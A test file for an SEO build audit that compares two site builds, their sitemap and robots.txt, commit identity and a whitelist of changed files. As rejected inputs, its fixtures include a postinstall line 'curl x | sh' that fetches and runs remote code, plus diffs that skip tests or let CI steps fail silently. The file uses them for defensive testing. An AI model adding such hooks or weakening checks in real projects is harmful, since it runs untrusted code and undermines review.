import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { loadPrerenderedBuild, verifyDiscoveryContinuityBuilds } from "@/lib/growth-agents/guardian-sources";
import {
  DISCOVERY_ADDITIVE_ONLY,
  DISCOVERY_RUNTIME_FILES,
  DISCOVERY_SUPPORT_FILES,
  auditDiscoveryContinuityBuilds,
  isDiscoveryContinuityFile,
  parseSitemapEntries,
} from "@/lib/growth-agents/discovery-continuity-render-audit";
import { isComparisonTemplateFile } from "@/lib/growth-agents/comparison-template-render-audit";

const BASE = "a".repeat(40);
const HEAD = "b".repeat(40);
const CANON = '<link rel="canonical" href="https://miloosh.com/x"/>';
const LD = '<script type="application/ld+json">{"@type":"Article","name":"X"}</script>';
const page = (body: string, head = `<title>T</title>${CANON}<meta name="robots" content="index,follow"/>${LD}`) =>
  `<!DOCTYPE html><html><head>${head}</head><body>${body}</body></html>`;

const sitemap = (n = 1200, lastmod = "2026-10-01") =>
  `<?xml version="1.0"?><urlset>${Array.from({ length: n }, (_, i) => `<url><loc>https://miloosh.com/p${i}</loc><lastmod>${lastmod}</lastmod></url>`).join("")}</urlset>`;
const ROBOTS = "User-Agent: *\nAllow: /\nSitemap: https://miloosh.com/sitemap.xml\n";

function builds() {
  const before = new Map<string, string>();
  for (let i = 0; i < 1750; i += 1) before.set(`p${i}.html`, page(`body ${i} <a href="/p${i + 1}" rel="">next</a>`));
  return { before, after: new Map(before) };
}

type Input = Parameters<typeof auditDiscoveryContinuityBuilds>[0];
type Mutable = Omit<Input, "before" | "after"> & { before: Map<string, string>; after: Map<string, string> };
const input = (extra: Partial<Mutable> = {}): Mutable => {
  const { before, after } = builds();
  return {
    before,
    after,
    beforeSitemap: sitemap(),
    afterSitemap: sitemap(),
    beforeRobots: ROBOTS,
    afterRobots: ROBOTS,
    baseCheckoutSha: BASE,
    candidateCheckoutSha: HEAD,
    baseClean: true,
    candidateClean: true,
    baseSha: BASE,
    headSha: HEAD,
    changedFiles: ["app/sitemap.ts", "app/software/[slug]/page.tsx", "lib/discovery-continuity.ts", "data/seo/discovery-baseline.ts"],
    sharedFileDiffs: {},
    ...extra,
  };
};
const errorsOf = (i: Mutable) => auditDiscoveryContinuityBuilds(i).errors.join("|");

describe("auditDiscoveryContinuityBuilds", () => {
  it("passes when the complete builds, sitemap and robots are identical and only the reviewed files changed", () => {
    const audit = auditDiscoveryContinuityBuilds(input());
    expect(audit.errors).toEqual([]);
    expect(audit).toMatchObject({ ok: true, pagesCompared: 1750, changedPages: 0, sitemapUrls: 1200, sitemapIdentical: true, robotsIdentical: true });
  });

  it("ignores build noise only (hashed asset names, framework scripts, deployment ids)", () => {
    const i = input();
    i.before.set("p0.html", page('x <script src="/_next/static/chunks/aaa.js"></script><link href="/_next/static/css/a.css?dpl=one"/>'));
    i.after.set("p0.html", page('x <script src="/_next/static/chunks/bbb.js"></script><link href="/_next/static/css/b.css?dpl=two"/>'));
    expect(auditDiscoveryContinuityBuilds(i).ok).toBe(true);
  });

  describe("any page difference fails, including one that is not held", () => {
    it.each([
      ["page text", (h: string) => h.replace("body 5", "body five"), "PAGE_CHANGED"],
      ["a link", (h: string) => h.replace('href="/p6"', 'href="/p7"'), "LINKS_CHANGED"],
      ["a removed link", (h: string) => h.replace(/<a [^>]*>next<\/a>/, ""), "LINKS_CHANGED"],
      ["the canonical", (h: string) => h.replace("https://miloosh.com/x", "https://miloosh.com/y"), "CANONICAL_CHANGED"],
      ["a noindex", (h: string) => h.replace("index,follow", "noindex,nofollow"), "ROBOTS_META_CHANGED"],
      ["the JSON-LD", (h: string) => h.replace('"name":"X"', '"name":"Z"'), "JSON_LD_CHANGED"],
      ["the title", (h: string) => h.replace("<title>T</title>", "<title>U</title>"), "HEAD_CHANGED"],
    ])("fails on %s", (_label, mutate, code) => {
      const i = input();
      i.after.set("p5.html", mutate(i.before.get("p5.html")!));
      const audit = auditDiscoveryContinuityBuilds(i);
      expect(audit.ok).toBe(false);
      expect(audit.errors.join("|")).toContain(`${code}: p5.html`);
    });
  });

  it("fails when a page is added or dropped", () => {
    const added = input();
    added.after.set("new.html", page("new"));
    expect(errorsOf(added)).toContain("PAGE_ADDED: new.html");
    const dropped = input();
    dropped.after.delete("p9.html");
    expect(errorsOf(dropped)).toContain("PAGE_DROPPED: p9.html");
  });

  it("fails on an empty, small or truncated build even when both builds match", () => {
    const small = input();
    for (const key of [...small.before.keys()].slice(100)) {
      small.before.delete(key);
      small.after.delete(key);
    }
    expect(errorsOf(small)).toContain("at least 1700 are required");
    const empty = input({ before: new Map(), after: new Map() });
    expect(auditDiscoveryContinuityBuilds(empty).ok).toBe(false);
    const partial = input();
    partial.before.set("p3.html", "<html><head>");
    partial.after.set("p3.html", "<html><head>");
    expect(errorsOf(partial)).toContain("PAGE_INCOMPLETE: p3.html");
  });

  describe("sitemap and robots", () => {
    it("fails when either is missing", () => {
      expect(errorsOf(input({ afterSitemap: null }))).toContain("SITEMAP_MISSING");
      expect(errorsOf(input({ beforeSitemap: null }))).toContain("SITEMAP_MISSING");
      expect(errorsOf(input({ afterRobots: null }))).toContain("ROBOTS_MISSING");
      expect(errorsOf(input({ beforeRobots: null }))).toContain("ROBOTS_MISSING");
    });
    it("fails when a sitemap URL is dropped or added", () => {
      expect(errorsOf(input({ afterSitemap: sitemap(1199) }))).toContain("SITEMAP_CHANGED");
      expect(errorsOf(input({ afterSitemap: sitemap(1201) }))).toContain("SITEMAP_CHANGED");
    });
    it("fails when only a lastmod changes", () => {
      expect(errorsOf(input({ afterSitemap: sitemap(1200, "2026-10-02") }))).toContain("SITEMAP_CHANGED");
    });
    it("fails on a trivial sitemap or robots even if identical", () => {
      expect(errorsOf(input({ beforeSitemap: sitemap(3), afterSitemap: sitemap(3) }))).toContain("SITEMAP_TOO_SMALL");
      expect(errorsOf(input({ beforeRobots: "", afterRobots: "" }))).toContain("ROBOTS_UNREADABLE");
    });
    it("fails when robots.txt changes", () => {
      expect(errorsOf(input({ afterRobots: `${ROBOTS}Disallow: /software\n` }))).toContain("ROBOTS_CHANGED");
    });
  });

  describe("commit identity and cleanliness", () => {
    it("fails on a wrong SHA in either checkout", () => {
      expect(errorsOf(input({ candidateCheckoutSha: "c".repeat(40) }))).toContain("not at the exact head commit");
      expect(errorsOf(input({ baseCheckoutSha: "c".repeat(40) }))).toContain("not at the exact base commit");
      expect(errorsOf(input({ baseCheckoutSha: null }))).toContain("not at the exact base commit");
    });
    it("fails on abbreviated or identical ids", () => {
      const short = input({ baseSha: BASE.slice(0, 7), baseCheckoutSha: BASE.slice(0, 7) });
      expect(errorsOf(short)).toContain("full 40-character");
      expect(errorsOf(input({ headSha: BASE, candidateCheckoutSha: BASE }))).toContain("same commit");
    });
    it("fails on a dirty checkout", () => {
      expect(errorsOf(input({ baseClean: false }))).toContain("uncommitted");
      expect(errorsOf(input({ candidateClean: false }))).toContain("uncommitted");
    });
  });

  describe("source scope", () => {
    it("fails on an unrelated changed file, a product data edit, a canonical or robots source edit", () => {
      for (const file of ["components/Cta.tsx", "data/software/slack.json", "app/robots.ts", "app/layout.tsx", "app/sitemap.xml/route.ts", "data/software/schema.ts", "lib/indexing-quality.ts"]) {
        expect(errorsOf(input({ changedFiles: ["app/sitemap.ts", file] }))).toContain(`FILE_OUT_OF_SCOPE: ${file}`);
      }
    });
    it("fails when no changed files are reported", () => {
      expect(errorsOf(input({ changedFiles: [] }))).toContain("No changed files");
    });
    it("lets package.json and the workflows gain only the reviewed lines", () => {
      const pkg = '+    "seo:release-sentinel": "tsx scripts/seo/release-sentinel.ts",\n+    "seo:reverification-queue": "tsx scripts/seo/reverification-queue.ts",';
      const ci = "+      - name: SEO discovery sentinel\n+        run: npm run seo:release-sentinel\n+";
      const ok = input({ changedFiles: ["app/sitemap.ts", "package.json", ".github/workflows/ci.yml"], sharedFileDiffs: { "package.json": pkg, ".github/workflows/ci.yml": ci } });
      expect(auditDiscoveryContinuityBuilds(ok).errors).toEqual([]);
    });
    it("fails when package.json removes or alters a script or adds an unreviewed one", () => {
      const run = (diff: string) => errorsOf(input({ changedFiles: ["app/sitemap.ts", "package.json"], sharedFileDiffs: { "package.json": diff } }));
      expect(run('-    "test": "vitest run",\n+    "test": "echo skipped",')).toContain("SHARED_FILE_LINE_REMOVED");
      expect(run('+    "test": "echo skipped",')).toContain("SHARED_FILE_LINE_NOT_REVIEWED");
      expect(run('+    "postinstall": "curl x | sh",')).toContain("SHARED_FILE_LINE_NOT_REVIEWED");
      expect(run("")).toContain("SHARED_FILE_DIFF_EMPTY");
      expect(errorsOf(input({ changedFiles: ["app/sitemap.ts", "package.json"] }))).toContain("SHARED_FILE_DIFF_MISSING");
    });
    it("lets the run-book gain only the discovery option rows", () => {
      const rb = ".agents/skills/miloosh-growth-director/references/run-book.md";
      const ok = "+| `--discovery-render-base <worktree>` | Root of a clean worktree. |";
      expect(auditDiscoveryContinuityBuilds(input({ changedFiles: ["app/sitemap.ts", rb], sharedFileDiffs: { [rb]: ok } })).errors).toEqual([]);
      expect(errorsOf(input({ changedFiles: ["app/sitemap.ts", rb], sharedFileDiffs: { [rb]: "+Gates may be skipped." } }))).toContain("SHARED_FILE_LINE_NOT_REVIEWED");
    });
    it("fails when a CI step is weakened rather than added", () => {
      const run = (diff: string) => errorsOf(input({ changedFiles: ["app/sitemap.ts", ".github/workflows/ci.yml"], sharedFileDiffs: { ".github/workflows/ci.yml": diff } }));
      expect(run("-      - name: Lint\n-        run: npm run lint")).toContain("SHARED_FILE_LINE_REMOVED");
      expect(run("+        continue-on-error: true")).toContain("SHARED_FILE_LINE_NOT_REVIEWED");
    });
  });
});

describe("the exact file whitelist", () => {
  it("contains only literal paths: no wildcard, directory or prefix", () => {
    for (const file of [...DISCOVERY_RUNTIME_FILES, ...DISCOVERY_SUPPORT_FILES, ...Object.keys(DISCOVERY_ADDITIVE_ONLY)]) {
      expect(file).not.toMatch(/[*?]|\/$/);
      expect(isDiscoveryContinuityFile(file)).toBe(true);
    }
    expect(isDiscoveryContinuityFile("app/sitemap.ts/../layout.tsx")).toBe(false);
    expect(isDiscoveryContinuityFile("lib/discovery-continuity.tsx")).toBe(false);
    expect(isDiscoveryContinuityFile("data/software/slack.json")).toBe(false);
    expect(isDiscoveryContinuityFile("docs/growth/receipts/anything.md")).toBe(false);
  });
  it("does not widen what the runtime may be: the runtime list is exactly the five reviewed files", () => {
    expect([...DISCOVERY_RUNTIME_FILES].sort()).toEqual(["app/sitemap.ts", "app/software/[slug]/page.tsx", "data/seo/discovery-baseline.ts", "lib/discovery-continuity.ts", "scripts/maintenance/seo.ts"]);
  });
  it("never covers product data, robots, canonical sources or other proofs' files", () => {
    for (const file of ["app/robots.ts", "app/layout.tsx", "components/PricingSection.tsx", "data/software/front.json", "data/seo/price-label-hold.json"]) expect(isDiscoveryContinuityFile(file)).toBe(false);
  });
  it("is not borrowed by the comparison-template proof (the proofs stay separate)", () => {
    expect(isComparisonTemplateFile("lib/discovery-continuity.ts")).toBe(false);
    expect(isComparisonTemplateFile("lib/growth-agents/discovery-continuity-render-audit.ts")).toBe(false);
  });
});

describe("parseSitemapEntries", () => {
  it("reads loc and lastmod in file order", () => {
    expect(parseSitemapEntries("<urlset><url><loc>https://a/</loc><lastmod>2026-01-01</lastmod></url><url><loc>https://b/</loc></url></urlset>")).toEqual([
      { loc: "https://a/", lastmod: "2026-01-01" },
      { loc: "https://b/", lastmod: "" },
    ]);
  });
});

describe("verifyDiscoveryContinuityBuilds (read-only adapter on real clean worktrees)", () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "discovery-proof-"));
  afterAll(() => fs.rmSync(tmp, { recursive: true, force: true }));
  const git = (cwd: string, ...args: string[]) => execFileSync("git", args, { cwd, encoding: "utf8", env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } }).trim();
  const repo = path.join(tmp, "repo");
  fs.mkdirSync(repo);
  git(repo, "init", "-q", "-b", "main");
  fs.mkdirSync(path.join(repo, "app"));
  fs.writeFileSync(path.join(repo, ".gitignore"), ".next\n");
  fs.writeFileSync(path.join(repo, "app/sitemap.ts"), "export default 1;\n");
  fs.writeFileSync(path.join(repo, "other.txt"), "x\n");
  git(repo, "add", "-A");
  git(repo, "commit", "-qm", "base");
  const base = git(repo, "rev-parse", "HEAD");
  fs.writeFileSync(path.join(repo, "app/sitemap.ts"), "export default 2;\n");
  git(repo, "commit", "-qam", "head");
  const head = git(repo, "rev-parse", "HEAD");
  fs.writeFileSync(path.join(repo, "other.txt"), "y\n");
  git(repo, "commit", "-qam", "unrelated");
  const unrelatedHead = git(repo, "rev-parse", "HEAD");
  const baseTree = path.join(tmp, "base");
  const headTree = path.join(tmp, "head");
  const badTree = path.join(tmp, "unrelated");
  git(repo, "worktree", "add", "-q", "--detach", baseTree, base);
  git(repo, "worktree", "add", "-q", "--detach", headTree, head);
  git(repo, "worktree", "add", "-q", "--detach", badTree, unrelatedHead);

  const writeBuild = (root: string, mutate: (name: string, html: string) => string = (_n, h) => h, sm = sitemap(), robots = ROBOTS) => {
    const app = path.join(root, ".next/server/app");
    fs.mkdirSync(path.join(app, "software"), { recursive: true });
    for (let i = 0; i < 1710; i += 1) {
      const name = i % 2 ? `software/p${i}.html` : `p${i}.html`;
      fs.writeFileSync(path.join(app, name), mutate(name, page(`body ${i}`)));
    }
    if (sm !== null) fs.writeFileSync(path.join(app, "sitemap.xml.body"), sm);
    if (robots !== null) fs.writeFileSync(path.join(app, "robots.txt.body"), robots);
  };

  it("loads every html page plus the sitemap and robots bodies, relative to the app folder", () => {
    writeBuild(baseTree);
    const loaded = loadPrerenderedBuild(baseTree);
    expect(loaded.html.size).toBe(1710);
    expect(loaded.html.has("software/p1.html")).toBe(true);
    expect(loaded.sitemap).toContain("<urlset>");
    expect(loaded.robots).toBe(ROBOTS);
  });

  it("passes on two clean pinned worktrees whose complete outputs are identical, with the reviewed file changed", () => {
    writeBuild(baseTree);
    writeBuild(headTree);
    const audit = verifyDiscoveryContinuityBuilds({ baseDir: baseTree, candidateDir: headTree, baseSha: base, headSha: head });
    expect(audit.errors).toEqual([]);
    expect(audit).toMatchObject({ ok: true, pagesCompared: 1710, changedPages: 0, changedFilesChecked: 1 });
  });

  it("fails on a changed page, a missing sitemap, a user-supplied wrong SHA, and an unreviewed changed file", () => {
    writeBuild(baseTree);
    writeBuild(headTree, (name, html) => (name === "p4.html" ? html.replace("body 4", "body four") : html));
    expect(verifyDiscoveryContinuityBuilds({ baseDir: baseTree, candidateDir: headTree, baseSha: base, headSha: head }).errors.join("|")).toContain("PAGE_CHANGED: p4.html");
    fs.rmSync(path.join(headTree, ".next"), { recursive: true });
    writeBuild(headTree, undefined, null as unknown as string);
    fs.rmSync(path.join(headTree, ".next/server/app/sitemap.xml.body"), { force: true });
    expect(verifyDiscoveryContinuityBuilds({ baseDir: baseTree, candidateDir: headTree, baseSha: base, headSha: head }).errors.join("|")).toContain("SITEMAP_MISSING");
    writeBuild(headTree);
    expect(verifyDiscoveryContinuityBuilds({ baseDir: baseTree, candidateDir: headTree, baseSha: base, headSha: unrelatedHead }).errors.join("|")).toContain("not at the exact head commit");
    writeBuild(badTree);
    expect(verifyDiscoveryContinuityBuilds({ baseDir: baseTree, candidateDir: badTree, baseSha: base, headSha: unrelatedHead }).errors.join("|")).toContain("FILE_OUT_OF_SCOPE: other.txt");
  });

  it("fails on a dirty checkout and on a missing build folder, and never writes to either worktree", () => {
    writeBuild(baseTree);
    writeBuild(headTree);
    fs.writeFileSync(path.join(headTree, "stray.txt"), "dirty");
    expect(verifyDiscoveryContinuityBuilds({ baseDir: baseTree, candidateDir: headTree, baseSha: base, headSha: head }).errors.join("|")).toContain("uncommitted");
    fs.rmSync(path.join(headTree, "stray.txt"));
    const before = git(headTree, "status", "--porcelain");
    verifyDiscoveryContinuityBuilds({ baseDir: baseTree, candidateDir: headTree, baseSha: base, headSha: head });
    expect(git(headTree, "status", "--porcelain")).toBe(before);
    const missing = verifyDiscoveryContinuityBuilds({ baseDir: path.join(tmp, "nope"), candidateDir: headTree, baseSha: base, headSha: head });
    expect(missing.ok).toBe(false);
  });
});
